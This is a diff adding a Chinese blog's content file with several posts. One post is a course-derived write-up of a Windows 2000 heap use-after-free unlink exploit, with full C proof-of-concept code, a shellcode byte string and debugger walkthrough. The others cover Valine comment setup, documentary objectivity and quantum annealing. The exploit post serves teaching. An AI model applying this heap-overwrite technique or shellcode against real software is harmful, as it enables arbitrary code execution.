+  placeholder: &#39;评论在后台人工审核后可见；\n留下邮箱可以接收回复等通知 ~&#39;,
+  avatar     : &#39;mm&#39;,
+  meta       : guest,
+  pageSize   : 10,
+  visitor    : false,
+  lang       : &#39;zh-cn&#39;,
+  recordIP   : false
+&#125;);
+&lt;&#x2F;script&gt;</code></pre>
+<p>之后把 Valine.min.js 路径引入 html，并把 <code>&lt;div class=&quot;comments&quot; id=&quot;valine-comments&quot;&gt;&lt;/div&gt;</code> 放到你网页中想让评论页面出现的地方就行了。</p>
+<p>Valine.min.js文件：<a href="https://github.com/UdUklm/NeoValine/tree/master/dist">https://github.com/UdUklm/NeoValine/tree/master/dist</a></p>
+<p>或者你可以使用 CDN：<code>cdn.jsdelivr.net/gh/OuYanghaoyue/NeoValine@0.1/dist/Valine.min.js</code></p>
+]]></content>
+      <categories>
+        <category>我的项目</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>评论系统</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows 内存释放后写入漏洞的简单利用</title>
+    <url>/archives/10/</url>
+    <content><![CDATA[<p>曾经在软件安全这门课中做过一个动态内存安全方面的 Presentation，现在对其做一个简单整理。</p>
+<h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2>
+<p>利用 Windows RtlHeap 内存管理原理，在<strong>内存释放后覆盖空闲块的前后向指针</strong>，并<strong>触发 unlink</strong> 来实现前向指针的任意写。</p>
+<h3 id="windows-unlink"><a class="markdownIt-Anchor" href="#windows-unlink"></a> Windows &amp; Unlink</h3>
+<p>Windows 是闭源系统，通过逆向人员的研究可知，Windows 的 Unlink 操作与 Linux 基本一致：</p>
+<img src="/archives/10/10_1.png" class="" title="unlink">
+<a id="more"></a>
+<p>Windows 的 RtlHeap 结构：</p>
+<img src="/archives/10/10_2.png" class="" title="rtlheap结构">
+<h3 id="基本操作"><a class="markdownIt-Anchor" href="#基本操作"></a> 基本操作</h3>
+<img src="/archives/10/10_3.png" class="" title="unlink例子">
+<p>将空闲块的前向指针覆盖为待覆写的地址，后向指针覆盖为 Shellcode 的地址，该空闲块被再次分配的时候，通过 unlink 操作实现任意写：将后向指针（ Shellcode 地址）写入前向指针（待覆写内存的地址指针）所指向的内存。</p>
+<p>即将 H1 的 FP 的内容写入到 H1 的 BP 所指的地址。</p>
+<h2 id="调试分析"><a class="markdownIt-Anchor" href="#调试分析"></a> 调试分析</h2>
+<h3 id="调试环境"><a class="markdownIt-Anchor" href="#调试环境"></a> 调试环境</h3>
+<ul>
+<li>操作系统：Windows 2000 5.00.2195</li>
+<li>编译：VC 6.0</li>
+<li>调试工具：OllyDbg v1.10
+<ul>
+<li>插件：OllyHeapTrace v1.1</li>
+</ul>
+</li>
+</ul>
+<h3 id="源代码分析"><a class="markdownIt-Anchor" href="#源代码分析"></a> 源代码分析</h3>
+<p>代码来源：教材《Secure Coding in C and C++》</p>
+<h4 id="完整代码"><a class="markdownIt-Anchor" href="#完整代码"></a> 完整代码</h4>
+<pre class="language-c" data-language="c" data-line="" data-line-offset="0"><code class="language-c">#include &quot;windows.h&quot;
+
+typedef struct _unalloc &#123;
+    PVOID fp;
+    PVOID bp;
+&#125; unalloc, *Punalloc;
+
+char shellcode[] &#x3D; &quot;&quot;;
+
+int main(int argc, char *argv[]) &#123;
+    Punalloc h1;
+    HLOCAL h2 &#x3D; 0;
+    HANDLE hp;
+    hp &#x3D; HeapCreate(0, 0x1000, 0x10000);
+    h1 &#x3D; (Punalloc)HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);
+    HeapFree(hp, 0, h1);
+    h1-&gt;fp &#x3D; (PVOID)(0x0042A1AC - 4);
+    h1-&gt;bp &#x3D; shellcode;
+    h2 &#x3D; HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);
+    HeapFree(hp, 0, h2);
+    return 0;
+&#125;</code></pre>
+<h4 id="line-3-6"><a class="markdownIt-Anchor" href="#line-3-6"></a> Line 3-6</h4>
+<pre class="language-c" data-language="c" data-line="" data-line-offset="0"><code class="language-c">typedef struct _unalloc &#123;
+    PVOID fp;
+    PVOID bp;
+&#125; unalloc, *Punalloc;</code></pre>
+<p>定义空闲内存块的结构体。</p>
+<p><code>fp</code> 是空闲块的前向指针，<code>bp</code> 是空闲块的后向指针。</p>
+<p>其中的 <code>PVOID</code> 是 Windows 特有的结构体，可以当作字符指针来使用。</p>
+<h4 id="line-11-12"><a class="markdownIt-Anchor" href="#line-11-12"></a> Line 11-12</h4>
+<pre class="language-c" data-language="c" data-line="" data-line-offset="0"><code class="language-c">int main(int argc, char *argv[]) &#123;
+    Punalloc h1;
+    HLOCAL h2 &#x3D; 0;
+    ...
+    return 0;
+&#125;</code></pre>
+<p>第一行用之前定义的空闲内存块结构体声明一个堆指针 <code>h1</code>。</p>
+<p>第二行用 Windows 的内存块指针结构体 <code>HLOCAL</code> 声明一个内存块指针 <code>h2</code>。</p>
+<h4 id="line-13-14"><a class="markdownIt-Anchor" href="#line-13-14"></a> Line 13-14</h4>
+<pre class="language-c" data-language="c" data-line="" data-line-offset="0"><code class="language-c">int main(int argc, char *argv[]) &#123;
+    ...
+    HANDLE hp;
+    hp &#x3D; HeapCreate(0, 0x1000, 0x10000);
+    ...
+    return 0;
+&#125;</code></pre>
+<p>第一行用 Windows 的堆指针数据类型 <code>HANDLE</code> 声明一个堆指针 <code>hp</code>。</p>
+<p>第二行调用 <code>HeapCreate</code> 函数创建了一个新堆，初始大小为 <code>0x1000</code>，最大大小为 <code>0x10000</code>，堆起始地址返回给 <code>hp</code>。</p>
+<h4 id="line-15-16"><a class="markdownIt-Anchor" href="#line-15-16"></a> Line 15-16</h4>
+<pre class="language-c" data-language="c" data-line="" data-line-offset="0"><code class="language-c">int main(int argc, char *argv[]) &#123;
+    ...
+    h1 &#x3D; (Punalloc)HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);
+    HeapFree(hp, 0, h1);
+    ...
+    return 0;
+&#125;</code></pre>
+<p>第一行申请 <code>32</code> 字节大小的内存空间，强制转化为我们之前自定义的 <code>Punalloc</code> 结构体类型，起始地址返回给 <code>h1</code>。</p>
+<p>第二行将上一行申请来的内存块 <code>h1</code> 释放掉。</p>
+<p>这样 <code>h1</code> 就成了一个空闲块，并返回到 <code>FreeList[0]</code> 大空闲块的位置。</p>
+<h4 id="line-17-18"><a class="markdownIt-Anchor" href="#line-17-18"></a> Line 17-18</h4>
+<pre class="language-c" data-language="c" data-line="" data-line-offset="0"><code class="language-c">int main(int argc, char *argv[]) &#123;
+    ...
+    h1-&gt;fp &#x3D; (PVOID)(0x0042A1AC - 4);
+    h1-&gt;bp &#x3D; shellcode;
+    ...
+    return 0;
+&#125;</code></pre>
+<p>虽然 <code>h1</code> 的内存已经被释放，成为了一个空闲块，但是 <code>h1</code> 任然存着当初分配的内存的起始地址，此时此刻前后向指针都指向 <code>FreeList[0]</code> 头。</p>
+<p>第一行将空闲块的前向指针覆写为 <code>0x0042A1AC</code>（<code>HeapFree</code>的调用地址）。这个地址里面存着<code>HeapFree</code> 函数的入口点。</p>
+<p>第二行将空闲块的后向指针覆写为 <code>shellcode</code> 的地址。</p>
+<h4 id="line-19-20"><a class="markdownIt-Anchor" href="#line-19-20"></a> Line 19-20</h4>
+<pre class="language-c" data-language="c" data-line="" data-line-offset="0"><code class="language-c">int main(int argc, char *argv[]) &#123;
+    ...
+    h2 &#x3D; HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);
+    HeapFree(hp, 0, h2);
+    return 0;
+&#125;</code></pre>
+<p>再次申请一块 <code>32</code> 字节大小的内存块，系统会将之前 <code>h1</code> 回收的这块内存分配出来，这就意味着有 <code>unlink</code> 的操作。</p>
+<p>通过第一行对的内存申请实现任意写：将后向指针（<code>shellcode</code> 地址）写入前向指针（<code>HeapFree</code> 的地址）所指向的内存。</p>
+<p>第二行调用 <code>HeapFree</code> 函数，实际上是调用执行 <code>shellcode</code>。</p>
+<h3 id="实际调试"><a class="markdownIt-Anchor" href="#实际调试"></a> 实际调试</h3>
+<p>在 OD 里找到 <code>main</code> 函数入口点：</p>
+<img src="/archives/10/10_4.png" class="" title="10_4">
+<p>在执行完 <code>HeapCreate</code> 后，函数返回（<code>EAX</code>）堆起始地址，堆起始地址为 <code>0x00360000</code>：</p>
+<img src="/archives/10/10_5.png" class="" title="10_5">
+<p>在执行完 <code>HeapAlloc</code> 后，函数返回（<code>EAX</code>）申请的内存空间起始地址，起始地址为<code>0x00360688</code>：</p>
+<img src="/archives/10/10_6.png" class="" title="10_6">
+<p>堆起始地址偏移 <code>0x178</code> 处为 <code>FreeList[0]</code>，可看出 <code>h1</code> 的起始地址为 <code>0x00360688</code>：</p>
+<img src="/archives/10/10_7.png" class="" title="10_7">
+<p>申请的空间 <code>h1</code> 被初始化为 <code>0</code>：</p>
+<img src="/archives/10/10_8.png" class="" title="10_8">
+<p>主函数中的结构体的前后向指针的赋值：</p>
+<img src="/archives/10/10_9.png" class="" title="10_9">
+<p>可以看到在 <code>h1</code> 被释放后，其前后向指针已经被改写了；后向指针被改为待覆写地址 <code>0x0042A1AC</code>，后向指针被改写为 <code>shellcode</code> 的地址：</p>
+<img src="/archives/10/10_10.png" class="" title="10_10">
+<p>在 IDA 里可以查到 <code>HeapFree</code> 的调用地址为 <code>0x0042A1AC</code>：</p>
+<img src="/archives/10/10_11.png" class="" title="10_11">
+<p>此处相当于 Linux 中的 GOT 表，<code>0x0042A1AC</code> 中存储的是 <code>HeapFree</code> 在 kernel32.dll 中的函数入口地址：</p>
+<img src="/archives/10/10_12.png" class="" title="10_12">
+<p>但是在 <code>HeapAlloc</code> <code>h2</code> 时，由于 Windows 自己的安全检查机制，该 GOT 表处被改成了堆上的一个地址：</p>
+<img src="/archives/10/10_13.png" class="" title="10_13">
+<p>自然，代码跳到了堆上执行，而没有跳到预期的 <code>shellcode</code> 上执行</p>
+<img src="/archives/10/10_14.png" class="" title="10_14">
+<p>漏洞利用<strong>失败</strong>！</p>
+<h3 id="改进利用代码"><a class="markdownIt-Anchor" href="#改进利用代码"></a> 改进利用代码</h3>
+<p>第 16 行执行结束后，<code>h1</code> 被释放，所有的区域都是空闲的，形成一个大的空闲块，<code>FreeList[0]=h1</code>。<code>h1</code> 之前 <code>8</code> 个字节存放的是整个空闲块的边界标志，<code>h1</code> 处存放的是 <code>Freelist[0]</code> 的地址值，<code>h1</code> 执行完 18 行时，第一块的前后向指针被成功的覆写。但是执行到第 19 行时，unlink 执行成功，但是程序紧接着会报错，无法跳转执行 <code>shellcode</code>。</p>
+<p>花了很多时间调试和查资料才发现，这是由于 Windows 内存管理器对大空闲块（即 <code>FreeList[0]</code> 处存放的空闲块）的管理机制造成的。当整个空闲块的前后向指针被覆写，空闲块分配一部分内存块给 <code>h2</code> 之后，剩余空闲块的边界标志和前后向指针发生了变化，其中前向指针被修改为 <code>D1=[0x0042A1AC-4]</code>（<code>0x0042A1AC</code> 为函数 <code>HeapFree</code> 的地址），后向指针被修改为 <code>D2=[[0x042817C-4]+4]</code>，而内存管理器需要将 <code>D2</code> 的前向指针，<code>D1</code> 的后向指针更新为大空闲块此时的地址，但是发现 <code>D2</code> 处<strong>有内存保护，不能执行写操作</strong>。因此程序报错，不能往下执行。</p>
+<p>所以解决思路是：如果已释放内存块 <code>h1</code> 被放入了 <code>FreeList[5]</code> 而不是和其余未分配内存一起放入了 <code>FreeList[0]</code> 中，那么此时通过修改 <code>h1</code> 的前后向指针，就可以达到攻击目的。</p>
+<p>具体的解决方案就是：在申请了第一个内存块之后，再申请一个内存块，那么当第一个内存块被释放后，由于第二个内存块将第一个内存块与未分配内存分隔开了，所以第一个内存块就被放入到 <code>FreeList[5]</code> 中，之后修改 <code>h1</code> 的前后向指针，当用户再次申请和第一块内存同样大小的内存块是，执行 unlink 操作，<code>HeapFree</code> 函数的地址被 <code>shellcode</code> 的自己所覆盖，再次调用 <code>HeapFree</code> 函数时，触发 <code>shellcode</code>。</p>
+<p>改进后的完整代码如下：</p>
+<pre class="language-c" data-language="c" data-line="" data-line-offset="0"><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &quot;windows.h&quot;
+#include &lt;tchar.h&gt;
+
+typedef struct _unalloc &#123;
+    PVOID fp;
+    PVOID bp;
+&#125; unalloc, *Punalloc;
+
+char shellcode[] &#x3D; 
+&quot;\x90\x90\x90\x90\x20\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+&quot;\x90\x33\xdb\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8b&quot;
+&quot;\xc4\x53\x50\x50\x53\xb8\x68\x3d\xe2\x77\xff\xd0\x90\x90\x90&quot;
+&quot;\x90\x90\x90\xb8\xbb\xb0\xe7\x77\xff\xd0\x90\x90\x90\x90&quot;;
+
+int main(int argc, char *argv[]) &#123;
+    Punalloc h1;
+    HLOCAL h2 &#x3D; 0, h3 &#x3D; 0;
+    HANDLE hp;
+    LoadLibrary(&quot;user32.dll&quot;);
+    hp &#x3D; HeapCreate(0, 0x1000, 0x10000);
+    h1 &#x3D; (Punalloc)HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);
+    h2 &#x3D; HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);
+    HeapFree(hp, 0, h1);
+    h1-&gt;fp &#x3D; (PVOID)(0x0042A1AC - 4);
+    h1-&gt;bp &#x3D; shellcode;
+    h3 &#x3D; HeapAlloc(hp, HEAP_ZERO_MEMORY, 32);
+    HeapFree(hp, 0, h2);
+    return 0;
+&#125;</code></pre>
+<p>在 <code>h1</code> 分配空间之后再申请一次空间，这样的话释放后的 <code>h1</code> 就不会放回 <code>FreeList[0]</code> 而会被放到 <code>FreeList[5]</code>。</p>
+<p><code>h1</code> 和 <code>h2</code> 分配空间之后：</p>
+<img src="/archives/10/10_15.png" class="" title="10_15">
+<p><code>h1</code> 被 free 之后：</p>
+<img src="/archives/10/10_16.png" class="" title="10_16">
+<p><code>h1</code> 的前后向指针被覆写之后：</p>
+<img src="/archives/10/10_17.jpg" class="" title="10_17">
+<p>unlink 并分配 <code>h3</code> 之后：</p>
+<img src="/archives/10/10_18.png" class="" title="10_18">
+<h3 id="改进后调试"><a class="markdownIt-Anchor" href="#改进后调试"></a> 改进后调试</h3>
+<p>成功：</p>
+<img src="/archives/10/10_19.png" class="" title="结果">
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>漏洞利用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅谈纪录片的客观性与主观性</title>
+    <url>/archives/9/</url>
+    <content><![CDATA[<p>真实性是纪录片的最大魅力，是纪录片这种影视作品的最大特点，也是《舌尖上的中国》等作品并不被纪录片主流学术界认可的原因。而真实与虚假，客观与主观在很多时候往往是被配套使用的两组词。这就很容易让人产生一种感觉：纪录片应该追求客观。但是在纪录片等艺术创作形式中，真实和客观其实是不能划等号的。真实的东西不一定就是客观的东西。纪录片归根结底是一种艺术创作形式，而主观色彩就是现代艺术创作的源泉。</p>
+<p>今天我就来说一下，在看了几部纪录片以后，我自己对于纪录片中存在的客观性与主观性的简单看法。</p>
+<a id="more"></a>
+<h2 id="人是主观与客观的结合体"><a class="markdownIt-Anchor" href="#人是主观与客观的结合体"></a> 人是主观与客观的结合体</h2>
+<p><strong>追求客观这个行为本身就是一种很主观的行为</strong>。</p>
+<p>主观作为人的一大思考方式，几乎不可能从人脑中剔除。现代人有时会很刻意地去追求客观，与此同时唾弃一切主观的的东西，殊不知这种“刻意”其实也就是主观选择的表现。人就是一个复杂的主观和客观的结合体，可以说只要是人所做的事情就不可能没有任何主观的因素。适度地主观并不会推翻事物原有的客观性，更多的时候主观与客观是一种相辅相成、互相支持、缺一不可的关系。</p>
+<h2 id="选材的过程就是主观意志的体现"><a class="markdownIt-Anchor" href="#选材的过程就是主观意志的体现"></a> 选材的过程就是主观意志的体现</h2>
+<p>在我看过的纪录片里不乏一些看起来无比客观的片子，比如毫无造作的《浮生一日》，比如用上帝视角来审视人类的《家园》，比如完全没有解说词，看起来就像监控记录的《我们每日的面包》，比如纪录有关被学术界公认的温室效应的《难以忽视的真相》。这些片子所呈现的东西都是被大众广泛接受的，被认为是真实客观的东西。但是，这些片子里真的就不含主观的因素了吗？</p>
+<p>答案是否定的。在我看来，<strong>选材的过程就是主观意志的体现</strong>。《浮生一日》是导演凯文·麦克唐纳从来自全球的 4500 小时原素材中精心挑选剪辑出来的，这种挑选的过程其实就是导演主观选择的过程。《家园》等纪录片也一样，为什么<strong>科技给人类带来的无尽的便利，同时让地球对人口的承载能力不断提高</strong>等这些科技的优点根本不提或者只是简单略过，而不停抓住科技的缺点不放呢？这样看待科技的视角不也是主观的吗？所以在我看来，哪怕是像《我们每日的面包》这样的陈述性纪录片，在选材的时候也进行了主观人为的取舍。除非是机器人独立随机拍出来的纪录片，否则所有的纪录片或多或少地都带有一些主观色彩。</p>
+<h2 id="纪录片的真实性与主观的存在并不矛盾"><a class="markdownIt-Anchor" href="#纪录片的真实性与主观的存在并不矛盾"></a> 纪录片的真实性与主观的存在并不矛盾</h2>
+<p>主观色彩的存在会使纪录片丧失真实性吗？其实只要是适度的主观，并不会整个纪录片的真实性产生多大的影响，反而可以为纪录片增添一些吸引人的特性，例如趣味性。</p>
+<p>这个世界的许多事情是无比复杂的，如果陈述一件事情必须不分主次，面面俱到，那么这个故事就会没有侧重点，变得冗长而乏味。导演可以对全部事实进行筛选，筛去那些对导演所想要表达的思想没有帮助的部分而突出导演想重点表现的真实。占主流地位的结论性纪录片就是这样的纪录片。</p>
+<p>纪录片导演不能教被摄对象怎么说，不能强迫被摄对象怎么说，但可以引导被摄对象说出导演自己想听到的内容。这甚至应该是一个纪录片导演的基本能力。</p>
+<h2 id="主观性的存在也可以为纪录片增添魅力引导创新"><a class="markdownIt-Anchor" href="#主观性的存在也可以为纪录片增添魅力引导创新"></a> 主观性的存在也可以为纪录片增添魅力，引导创新</h2>
+<p>一个电影导演曾经说过这样一句话：“这个世界上百分之九十的故事都已经被拍完了，我们接下来要做的就是想办法把已经拍过的故事拍的更好看。”</p>
+<p>虽然这句话的准确性还有待考证，不过其中要表达的东西放在纪录片上也是可以的：可以拍摄的素材越来越少，怎么把有限的素材在保证真实性的同时拍出无限的新意，将是未来很多纪录片导演需要考虑的问题。而主观因素的进入正是用相同素材拍出不同纪录片的必要条件。</p>
+<p>比如同样是环保的素材，《海豚湾》注重故事性，突出了拍摄过程中惊险刺激的感觉，使得观众也跟着产生了紧张的感觉，宛如身临其境；《地球之盐》注重摄影，摄影题材与环保观点两条主线并进，最终在片尾回合，突出了摄影师眼中的环保；《食品公司》注重食品问题，站在了科技的对面，对现存的食品工厂模式提出了质疑；《家园》则更是站在上帝的角度，用一个“完全第三方”的角度来审视人类自身的行为；《竞速灭绝》则关注人类行为带来的“第五次生物大灭绝”，《难以忽视的真相》聚焦于温室效应给全球生态带来的潜在威胁…</p>
+<p>正是不同的观点使得这些纪录片各有各的特点，大大拓展了有限素材的使用价值，实现了纪录片的不断创新。要是全世界的纪录片导演都只拍陈述性纪录片，那么恐怕每年可以产出的纪录片就真的屈指可数了，而且由于题材的枯竭，产量会逐年减少。不难想象若真的是这样的话，纪录片迷将会成为一个无比小众的群体。</p>
+<p>当我们冷静一段时间之后来回看这些刚刚看完时感慨万千的纪录片的时候，其实不难发现其中的主观因素，而正是这些主观因素的存在，使得这些片子趣味横生，引人入胜。</p>
+<p>比如《监守自盗》中浓浓的剪辑意味，被采访者的话还没有说完就被导演剪掉了。换句话说，<strong>导演只把部分事实呈现在我们面前，而不是全部事实</strong>。我们可以说这样的做法视野狭窄，以一个外行人的眼光来看待、来评论专业金融学家的行为，但我们也可以说这样的做法还原了普通人眼中的金融危机，还原了金融危机中普通人面临的困境和金融巨贾的盆满钵满。这样的做法看似违背了某些事实，但实则显得更加真实。</p>
+<p>比如《海豚湾》，如果把渔民的行为概括起来，那就是露天屠杀一个难以驯化的物种。同样是屠杀，人们对上万头猪牛羊的屠杀熟视无睹，却对几百头海豚，几百条猫狗的屠杀大发慈悲之心。如果从更客观的角度来看，同样是动物，同样是生命，为什么我们要区别对待呢？</p>
+<p>又比如《食品公司》中所提倡的大自然放养式的饲养模式，看似美好，却抵不过眼前的现实。全球人口越来越多，除非科技自身实现突破，否则食品公司的现象将会在世界各地愈演愈烈。回到从前那种大面积放养牲畜的行为是完全不现实的，到最后仍要考科技进步来解决这一日益剧烈的矛盾。所以《食品公司》的行为并不像是一味忽略客观存在的倡导，更像是一次抛砖玉玉的提问，将食品问题摆到全球人类的面前供人反思，寻求出路。</p>
+<p>所以我认为，主观性让大部分纪录片具有了更明确的现实意义，承担了一种唤醒社会意识的责任和义务。结论性纪录片也有其存在的价值。</p>
+<h2 id="纪录片的主观不能超越客观而存在"><a class="markdownIt-Anchor" href="#纪录片的主观不能超越客观而存在"></a> 纪录片的主观不能超越客观而存在</h2>
+<p>说到底，纪录片在所有影视作品之中还是最客观的一类。纪录片之中的主观还是要为其客观的框架服务的。所以纪录片在叙述的时候应该尽可能地像客观靠拢，主观色彩不能超越客观框架而存在，更不能超越纪录片真实性的首要前提。</p>
+<p>简单来说就是，你可以决定说什么不说什么，但是不能编瞎话乱说。</p>
+<p>这和媒体还有一定的区别：对于媒体来说，只说一部分事实，往往意味着一定的误导性，而大部分的媒体又有着强观点的属性，只说一部分事实往往会和胡编乱造产生相同的效果。所以对于媒体，我会偏好那种在全方位细致的报道的基础上输出自己的观点，而纪录片说到底也还是一种文艺作品，导演应该有一定的内容取舍和强调偏重的空间。</p>
+<h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2>
+<p>我的基本观点如下：</p>
+<ol>
+<li>人是主观与客观的结合体</li>
+<li>选材的过程就是主观意志的体现</li>
+<li>纪录片的真实性与主观的存在并不矛盾</li>
+<li>主观性的存在也可以为纪录片增添魅力，引导创新</li>
+<li>纪录片的主观不能超越客观而存在</li>
+</ol>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>纪录片</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于量子退火算法的一些了解</title>
+    <url>/archives/8/</url>
+    <content><![CDATA[<div class="note warning"><p>本人并非量子力学相关专业人士，本文是在我搜集资料和个人理解的基础上整理出来的，仅供参考。</p>
+</div>
+<p>量子退火算法（Quantum annealing，QA）是一种基于量子特性的量子计算机算法，由经典计算机上的模拟退火算法（又称经典退火算法）演化而来。</p>
+<p>有的人认为量子退火算法可能是目前为止最重要的量子算法，并且量子退火算法已经在超级计算机上被模拟过了。</p>
+<p>而人类第一台商用量子计算机 D-Wave 就是一种只能运行量子退火算法的专用量子计算机，Google 和 NASA 合建的量子人工智能实验室用的就是这种计算机。</p>
+<p>本文将会沿着【为什么需要引入量子退火算法 ➡️ 量子退火算法的简单原理和优势 ➡️ 量子退火算法的应用和前景】的思路，整理一下我这几天对量子退火算法的一些了解。</p>
+<a id="more"></a>
+<h2 id="经典计算机处理问题遇到的困难"><a class="markdownIt-Anchor" href="#经典计算机处理问题遇到的困难"></a> 经典计算机处理问题遇到的困难</h2>
+<p>由于算力和算法等方面的限制，经典计算机无法很好地解决某些问题，比如组合优化问题。</p>
+<h3 id="组合优化问题"><a class="markdownIt-Anchor" href="#组合优化问题"></a> 组合优化问题</h3>
+<p>先说最优化问题。最优化问题是寻找一个目标函数的极大极小值。大多数机器学习问题最后都会转化为一个最优化问题。最优化问题一般分成两类：一类是连续变量的问题，另一类是离散变量的问题。具有离散变量的问题，就称为组合优化问题。</p>
+<p>组合优化问题一般是从一个无限集或者可数无限集里寻找一个对象，比如一个整数，一个集合，一个排列，或者一个图。即组合优化问题的解一般是一个离散空间。</p>
+<p>旅行商问题（Travelling salesman problem, TSP）是一个经典的组合优化问题：给定一系列城市和每对城市之间的距离，求解访问每一座城市一次并回到起始城市的最短回路。</p>
+<img src="/archives/8/tsp.jpeg" class="" title="旅行商问题">
+<p>旅行商问题是一个 NP-Hard 问题，其算法复杂度为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo></mrow><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">(n-1)! \over 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.355em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mclose mtight">!</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。如果 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span> 较大，则经典计算机将很难解决这样的问题。</p>
+<h3 id="引入模拟退火算法"><a class="markdownIt-Anchor" href="#引入模拟退火算法"></a> 引入模拟退火算法</h3>
+<p>为了更好地解决组合优化问题，科学家们发明了模拟退火算法。</p>
+<p>在冶金学中，退火是将材料加热后再经特定速率冷却，目的是增大晶粒的体积，并且减少晶格中的缺陷。材料中的原子原来会停留在使内能有局部最小值的位置，加热使能量变大，<strong>原子会离开原来位置，而随机在其他位置中移动</strong>。退火冷却时速度较慢，使得<strong>原子有较多可能可以找到内能比原先更低的位置</strong>。</p>
+<p>模拟退火算法的基本原理：</p>
+<ol>
+<li>以搜寻空间内一个任意点作起始点，以该点的状态作为临时最优解</li>
+<li>按照一个<strong>预设的概率</strong>选择一个近邻点</li>
+<li>计算该近邻点所代表的解与临时最优解相比是否为更优解。如果是更优解则更替该紧邻点的解为临时最优解，反之则临时最优解不变</li>
+<li>循环步骤 3 和 步骤 4</li>
+<li>足够多次的循环后，临时最优解会依概率收敛到全局最优解</li>
+</ol>
+<p>可以看出，模拟退火算法的原理和金属退火的原理十分相似：模拟退火步骤 2 中提到的<strong>预设的概率</strong>和金属退火时<strong>加热的温度</strong>很像。通过这个预设的概率，临时解可以离开原来的位置，尝试发现更优解：</p>
+<ul>
+<li>金属退火中，在一定限度内，加热温度越高，原子能够移动的距离越远，最后局部内能比原先更低的可能性越大。</li>
+<li>模拟退火中，在一定限度内，预设概率越大，临时解能够找到的点越多，最后临时解是全局最优解的可能性越大。</li>
+</ul>
+<p><strong>值得强调的一点是</strong>，在两种退火中，预设一个概率和控制加热的温度都是一种<strong>扰动</strong>。在该扰动下，解空间尝试不断发生改变，来发现并筛选出更优的解空间，最后一定概率会收敛到最优解空间。按照我的理解，这就是退火算法的核心思想。这甚至让我联想到了生物进化论。</p>
+<p>这里请先尝试理解模拟退火，后文中会提到模拟退火算法的具体例子以便加深理解。</p>
+<h2 id="量子退火的优越性"><a class="markdownIt-Anchor" href="#量子退火的优越性"></a> 量子退火的优越性</h2>
+<p>虽然对于许多组合优化问题，模拟退火算法已经有了不错的效果，但是对于某些问题，模拟算法要获得更优解会很费劲，需要大量的算力和时间。而量子退火算法可以更好的（甚至是碾压式地）解决这些问题。接下来先介绍一下粒子的波函数与量子隧穿效应，再从理论和实例两个维度来说明量子退火算法的优越性。</p>
+<h3 id="粒子的波函数与量子隧穿效应"><a class="markdownIt-Anchor" href="#粒子的波函数与量子隧穿效应"></a> 粒子的波函数与量子隧穿效应</h3>
+<p>这里说的波函数与某些说法中的物质波或德布罗意波，可能是指同一种东西。本文为了严谨，一律使用波函数这个称呼。</p>
+<p>前文说过，按我的理解，加入扰动来发现更优解是退火算法的核心思想。那么<strong>控制粒子的波函数（即改变粒子的哈密顿量）就是量子退火算法的扰动</strong>。</p>
+<p>在量子尺度，微观的物理对象都具有波动性和粒子性，其位置、动量、能量等在经典物理中确定的量都是不确定的。一个粒子有可能同时坐着飞机和高铁从杭州到达北京，这是经典物理无法解释的现象。而<strong>粒子的波函数和量子隧穿效应就是量子力学中粒子具有波动性的表现</strong>。</p>
+<p>在量子力学里，量子隧穿效应指电子等微观粒子能够穿入或穿越位势垒的量子行为，尽管位势垒的高度大于粒子的总能量。</p>
+<p>降维举例来说，这就像是墙边的一个人在一定概率下可以出现在墙的另一边（和瞬移有本质区别）。在经典力学里，这是不可能发生的。</p>
+<p>实际上，在量子力学中，粒子什么时候出现在哪里是一个概率问题。这个概率可以通过该粒子的波函数来反映。</p>
+<img src="/archives/8/quantum_001.jpeg" class="" title="量子隧穿效应">
+<p>如图，蓝色部分即表示该粒子的波函数。该粒子的波函数可以辐射到容器外，即该粒子有一定概率可以出现在容器外。</p>
+<h3 id="从理论的角度说明量子退火的优越性"><a class="markdownIt-Anchor" href="#从理论的角度说明量子退火的优越性"></a> 从理论的角度说明量子退火的优越性</h3>
